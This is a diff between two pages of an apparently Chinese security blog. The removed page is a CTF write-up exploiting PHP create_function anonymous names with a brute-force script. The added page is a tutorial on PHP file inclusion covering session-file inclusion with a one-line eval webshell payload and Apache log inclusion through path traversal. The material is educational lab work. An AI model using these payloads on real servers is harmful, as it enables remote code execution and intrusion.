@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PHP匿名函数 | Sh@d0w&#39;s blog</title>
-  <meta name="keywords" content=" php , 函数 ">
-  <meta name="description" content="PHP匿名函数 | Sh@d0w&#39;s blog">
+  <title>php文件包含 | Sh@d0w&#39;s blog</title>
+  <meta name="keywords" content=" 文件包含 , php ">
+  <meta name="description" content="php文件包含 | Sh@d0w&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="PHP文件包含漏洞利用思路与Bypass总结手册（一） PHP文件包含漏洞利用思路与Bypass总结手册（二） PHP文件包含漏洞利用思路与Bypass总结手册（三） PHP文件包含漏洞利用思路与Bypass总结手册（完结） 相关函数当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。 1、include()http:&#x2F;&#x2F;www.php.net&#x2F;m">
 <meta property="og:type" content="article">
@@ -508,9 +508,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-PHP匿名函数" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-php文件包含" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">PHP匿名函数</h1>
+        <h1 class="article-title">php文件包含</h1>
     
     <div class="article-meta">
         
@@ -527,21 +527,21 @@
         
         <span class="tag">
             
-            <a class="color4">php</a>
+            <a class="color5">文件包含</a>
             
-            <a class="color3">函数</a>
+            <a class="color4">php</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-05-03 11:14:43'>2020-05-03 11:12</time>
+        创建时间:<time class="date" title='更新时间: 2020-05-26 16:49:51'>2020-05-14 11:49</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:146</span>
+        <span>字数:523</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -571,7 +571,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#相关函数"><span class="toc-text">相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、include"><span class="toc-text">1、include()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、include-once"><span class="toc-text">2、include_once()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、require"><span class="toc-text">3、require()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、require-once"><span class="toc-text">4、require_once()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#包含姿势"><span class="toc-text">包含姿势</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#包含session"><span class="toc-text">包含session</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#默认路径"><span class="toc-text">默认路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命名格式"><span class="toc-text">命名格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#会话处理"><span class="toc-text">会话处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session-serialize-handler-php"><span class="toc-text">session.serialize_handler&#x3D;php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-serialize-handler-php-serialize"><span class="toc-text">session.serialize_handler&#x3D;php_serialize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session利用"><span class="toc-text">session利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#包含日志"><span class="toc-text">包含日志</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过"><span class="toc-text">绕过</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -587,36 +587,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <pre><code class="php">&lt;?php
+        <p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854852&idx=1&sn=0154f9bc04d0eccf7069c4a70a55edef&chksm=bd5926898a2eaf9fd700b394150a34ce46b663f8cc018015559d99517aae8cdb2d2d1c687d95&mpshare=1&scene=1&srcid=&sharer_sharetime=1587870952719&sharer_shareid=6118a6f7ffcd4dac97886912e9b73576&key=111d5d7ed497d596b9d15f860d702744833a50d2fc3434d3857d2b9415f66e0e396ec9e9c3f8b9204420d4be7d84da6c4c588c31b8cdad5dd781bce8c4e264924662a4f2d243349356c99a1662efc843&ascene=14&uin=MTg3Njc1MzQzOQ%3D%3D&devicetype=Windows+10+x64&version=62090072&lang=zh_CN&exportkey=A1d5eEUJf5drQbwWaUBxzL0%3D&pass_ticket=QOlMB4M4k9vD8DXbpX%2FhZGNLnlXmdsRbjOaewsoA2GCY%2B9uTwXfcE7pzq5ShhQ47" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（一）</a></p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854862&idx=1&sn=cad6b970d2a7837358e1a29dc5b661b5&chksm=bd5926838a2eaf95f0f228164ee4d56455ae00ef14667eb4c3250ec63bab84aac26c407b6dcf&scene=21#wechat_redirect" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（二）</a></p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854950&idx=1&sn=b04867a22cdef2fb7ce7a3c6ccad2985&chksm=bd59266b8a2eaf7d99d12dc18c19929f0765cf8b461b4b54271b22657232bda9d28e69fb698e&scene=21#wechat_redirect" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（三）</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652855008&idx=1&sn=7b7fbd09755f57345b5fbdeaa19f8456&chksm=bd59262d8a2eaf3bf9df282ad856eb8c9f0d326905038a04162d89e65e977257cda1d4dc4874&scene=126&sessionid=1589013319&key=fcccb4241fdfb8d120b6f95583f7ea0b695f54862760735ace2fb287485d7927266232a4d6dabf20c9ab1c8f49b520333e94ca1193c024a0305eb429bb5531a62e888b327c2a11c0f7ee6e0b95b4599c&ascene=1&uin=MTg3Njc1MzQzOQ%3D%3D&devicetype=Windows+10+x64&version=62090072&lang=zh_CN&exportkey=Axug5Ln%2B7z090B%2F0xhF2LUA%3D&pass_ticket=QOlMB4M4k9vD8DXbpX%2FhZGNLnlXmdsRbjOaewsoA2GCY%2B9uTwXfcE7pzq5ShhQ47" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（完结）</a></p>
+<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</p>
+<h2 id="1、include"><a href="#1、include" class="headerlink" title="1、include()"></a>1、include()</h2><p><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="noopener">http://www.php.net/manual/en/function.include.php</a></p>
+<p>include() 函数包含出错的话，只会提出警告，不会影响后续语句的执行</p>
+<h2 id="2、include-once"><a href="#2、include-once" class="headerlink" title="2、include_once()"></a>2、include_once()</h2><p><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="noopener">http://php.net/manual/en/function.include-once.php</a></p>
+<p>require() 函数包含出错的话，则会直接退出，后续语句不在执行</p>
+<h2 id="3、require"><a href="#3、require" class="headerlink" title="3、require()"></a>3、require()</h2><p><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="noopener">http://php.net/manual/en/function.require.php</a></p>
+<h2 id="4、require-once"><a href="#4、require-once" class="headerlink" title="4、require_once()"></a>4、require_once()</h2><p><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="noopener">http://php.net/manual/en/function.require-once.php</a></p>
+<p>require_once() 和 include_once() 功能与require() 和 include()  类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once()  则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
+<h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><p><a href="https://shadow-zz.github.io/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">php伪协议</a></p>
+<h1 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h1><h2 id="默认路径"><a href="#默认路径" class="headerlink" title="默认路径"></a>默认路径</h2><pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sessions/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID</code></pre><h2 id="命名格式"><a href="#命名格式" class="headerlink" title="命名格式"></a>命名格式</h2><p>sess_[phpsessid]</p>
+<p>phpsessid在发送的请求的cookie字段中可以看到。</p>
+<h2 id="会话处理"><a href="#会话处理" class="headerlink" title="会话处理"></a>会话处理</h2><h3 id="session-serialize-handler-php"><a href="#session-serialize-handler-php" class="headerlink" title="session.serialize_handler=php"></a>session.serialize_handler=php</h3><p>只对用户名的内容进行了序列化存储，没有对变量名进行序列化。</p>
+<h3 id="session-serialize-handler-php-serialize"><a href="#session-serialize-handler-php-serialize" class="headerlink" title="session.serialize_handler=php_serialize"></a>session.serialize_handler=php_serialize</h3><p>php5.5之后启用这种处理模式，它是用serialize反序列化格式进行存储用户的会话信息。</p>
+<p>对整个session信息包括文件名、文件内容都进行了序列化处理。</p>
+<h2 id="session利用"><a href="#session利用" class="headerlink" title="session利用"></a>session利用</h2><p><strong>利用条件</strong>：session文件路径已知，且其中内容部分可控。</p>
+<p>payload：</p>
+<pre><code>http://192.168.47.129/include/session.php
 
-$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);
-$hash = bin2hex(openssl_random_pseudo_bytes(32));
-eval(&quot;function SUCTF_$hash(){&quot;
-    .&quot;global \$MY;&quot;
-    .&quot;\$MY();&quot;
-    .&quot;}&quot;);
-if(isset($_GET[&#39;func_name&#39;])){
-    $_GET[&quot;func_name&quot;]();
-    die();
-}
-show_source(__FILE__);
-?&gt;</code></pre>
-<p>获取flag的函数是通过create_function，并没有设置函数名字，但其实这里声明的函数是有函数名的，匿名函数会被设置为\x00lambda_%d，这里的%d是顺序递增的。</p>
-<pre><code class="php">#coding=UTF-8
+POST:
+username=&lt;?php eval($_REQUEST[zxc]);?&gt;</code></pre><p><img src="/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200526163109745.png" alt></p>
+<pre><code>http://192.168.47.129/include/?file=/var/lib/php/sessions/sess_2ua3598bigiest0a0uct87fsd0&amp;zxc=phpinfo();</code></pre><p><img src="/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200526163403165.png" alt></p>
+<h1 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h1><p><strong>利用条件</strong>：</p>
+<pre><code>需要知道服务器日志的存储路径
+日志文件可读</code></pre><p>默认情况下apache log的位置：</p>
+<pre><code>Debian分支(Ubuntu等) /var/log/apache2/access.log
 
-import requests
-
-url = &quot;http://127.0.0.1:8002/?func_name=\%00lambda_&quot;
-
-for i in xrange(0,50):
-    zz = requests.get(url+str(i))
-    #print zz.content
-
-    if &#39;flag&#39; in zz.content:
-        print url+str(i)
-        print zz.content
-        break</code></pre>
-
+Fedora分支(Centos等) /var/log/httpd/access_log</code></pre><p>payload:</p>
+<pre><code>index.php?file=../../../../../var/log/apache2/access.log</code></pre><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854950&idx=1&sn=b04867a22cdef2fb7ce7a3c6ccad2985&chksm=bd59266b8a2eaf7d99d12dc18c19929f0765cf8b461b4b54271b22657232bda9d28e69fb698e&scene=21#wechat_redirect" target="_blank" rel="noopener">绕过</a></h1>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -625,12 +630,12 @@ for i in xrange(0,50):
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>PHP匿名函数</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">146</span></p>
+    <p><span class="copy-title">文章标题:</span>php文件包含</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">523</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="Sh@d0w">Sh@d0w</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-05-03, 11:12:37</p>
-    <p><span class="copy-title">最后更新:</span>2020-05-03, 11:14:43</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/05/03/PHP%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/" title="PHP匿名函数">https://shadow-zz.github.io/2020/05/03/PHP%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/</a>
+    <p><span class="copy-title">发布时间:</span>2020-05-14, 11:49:08</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-26, 16:49:51</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="php文件包含">https://shadow-zz.github.io/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
